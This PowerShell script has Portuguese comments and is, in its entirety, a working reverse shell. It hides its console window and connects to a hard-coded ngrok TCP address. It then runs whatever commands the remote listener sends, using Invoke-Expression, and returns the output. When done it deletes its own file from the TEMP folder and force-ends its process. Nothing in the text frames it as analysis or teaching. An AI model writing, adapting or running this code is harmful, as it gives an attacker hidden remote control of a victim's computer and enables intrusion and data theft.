# -----------------------------
# MINIMIZAR JANELA DO POWERSHELL
# -----------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hwnd = [WinAPI]::GetConsoleWindow()
[WinAPI]::ShowWindow($hwnd, 2)  # 2 = Minimizado

# -----------------------------
# CONFIGURAÇÕES
# -----------------------------
$ngrokHost = "7.tcp.eu.ngrok.io"
$ngrokPort = 14280

# -----------------------------
# CRIAR TCP CLIENTE
# -----------------------------
$client = New-Object System.Net.Sockets.TCPClient
try {
    $client.Connect($ngrokHost, $ngrokPort)
} catch {
    exit
}

$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
$writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
$writer.AutoFlush = $true

# -----------------------------
# LOOP PRINCIPAL SEMI-INTERATIVO
# -----------------------------
while ($true) {
    try {
        $command = $reader.ReadLine()
        if ([string]::IsNullOrWhiteSpace($command)) { continue }

        if ($command.Trim().ToLower() -eq "exit") {
            $writer.WriteLine("PowerShell minimizado será encerrado pelo listener.")
            break
        }

        $output = Invoke-Expression $command 2>&1 | Out-String
        $output += "PS " + (Get-Location).Path + "> "
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("ERRO: $_`nPS " + (Get-Location).Path + "> ")
    }
}

# -----------------------------
# APAGA O FICHEIRO AO FINAL
# -----------------------------
try {
    Remove-Item "$env:TEMP\scriptngrok.ps1" -ErrorAction SilentlyContinue
} catch {
    # Se falhar, ignora
}

# -----------------------------
# ENCERRA POWERSHELL AO DIGITAR exit
# -----------------------------
Stop-Process -Id $PID -Force







